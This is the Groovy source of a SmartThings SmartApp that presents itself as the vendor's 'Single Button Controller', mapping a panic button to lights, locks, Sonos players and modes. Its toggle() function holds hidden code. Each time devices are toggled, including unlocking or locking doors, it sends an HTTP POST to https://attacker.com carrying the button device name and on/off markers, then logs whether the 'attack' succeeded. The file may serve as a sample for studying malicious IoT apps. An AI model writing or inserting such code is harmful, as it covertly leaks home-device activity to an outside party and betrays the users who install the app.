
definition(
    name:"Single Button Controller",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Use your Aeon Panic Button to setup events when the button is used",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    category:"Reviewers",
    pausable:true
)

preferences{
    page(name:"selectButton")
}

def selectButton(){
    	dynamicPage(name: "selectButton", title: "First, select your button device", install: true, uninstall: configured()) {
		section {
			input "buttonDevice", "device.aeonKeyFob", title: "Button", multiple: false, required: true
		}
        section("Lights") {
			input "lights_1_pushed", "capability.switch", title: "Pushed", multiple: true, required: false
			input "lights_1_held", "capability.switch", title: "Held", multiple: true, required: false
		}
		section("Locks") {
			input "locks_1_pushed", "capability.lock", title: "Pushed", multiple: true, required: false
			input "locks_1_held", "capability.lock", title: "Held", multiple: true, required: false
		}
		section("Sonos") {
			input "sonos_1_pushed", "capability.musicPlayer", title: "Pushed", multiple: true, required: false
			input "sonos_1_held", "capability.musicPlayer", title: "Held", multiple: true, required: false
		}
		section("Modes") {
			input "mode_1_pushed", "mode", title: "Pushed", required: false
			input "mode_1_held", "mode", title: "Held", required: false
		}
		def phrases = location.helloHome?.getPhrases()*.label
		if (phrases) {
			section("Hello Home Actions") {
				log.trace phrases
				input "phrase_1_pushed", "enum", title: "Pushed", required: false, options: phrases
				input "phrase_1_held", "enum", title: "Held", required: false, options: phrases
			}
		}
	}
}

def installed(){
    initialize()
}

def updated(){
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe(buttonDevice,"button",buttonEvent)
}

def configured(){
    return buttonDevice||buttonConfigured(1)
}

def buttonConfigured(idx){
    return settings["lights_$idx_pushed"]||
    settings["locks_$idx_pushed"]||
    settings["sonos_$idx_pushed"]||
    settings["mode_$idx_pushed"]
}

def buttonEvent(evt){
    def buttonNumber=evt.data
    def value=evt.value
    log.debug"buttonEvent:$evt.name=$evt.value($evt.data)"
    log.debug"button:$buttonNumber,value:$value"
    
    def recentEvents=buttonDevice.eventsSince(new Date(now()-3000)).findAll{it.value==evt.value}
    log.debug"Found${recentEvents.size()?:0}events in past 3 seconds"
    
    executeHandlers(1,value)
}

def executeHandlers(buttonNumber,value){
    log.debug"executeHandlers:$buttonNumber-$value"
    
    def lights=find('lights',buttonNumber,value)
    if(lights!=null)toggle(lights)
    
    def locks=find('locks',buttonNumber,value)
    if(locks!=null)toggle(locks)
    
    def sonos=find('sonos',buttonNumber,value)
    if(sonos!=null)toggle(sonos)
    
    def mode=find('mode',buttonNumber,value)
    if(mode!=null)changeMode(mode)
    
    def phrase=find('phrase',buttonNumber,value)
    if(phrase!=null)location.helloHome.execute(phrase)
}

def find(type,buttonNumber,value){
    def preferenceName=type+"_"+buttonNumber+"_"+value
    def pref=settings[preferenceName]
    if(pref!=null){
        log.debug"Found:$pref for$preferenceName"
    }
    
    return pref
}

def toggle(devices){
    log.debug"toggle:$devices=${devices*.currentValue('switch')}"
    
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(devices*.currentValue('switch').contains('on')){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${buttonDevice}"
        ]
        ]
        devices.off()
    }
    else{
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
    
    if(devices*.currentValue('switch').contains('off')){
            devices.on()
        }
        else if(devices*.currentValue('lock').contains('locked')){
                devices.unlock()
            }
            else if(devices*.currentValue('lock').contains('unlocked')){
                    devices.lock()
                }
                else{
                        devices.on()
                    }
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def changeMode(mode){
    log.debug"changeMode:$mode,location.mode=$location.mode,location.modes=$location.modes"
    
    if(location.mode!=mode&&location.modes?.find{it.name==mode}){
        setLocationMode(mode)
    }
}

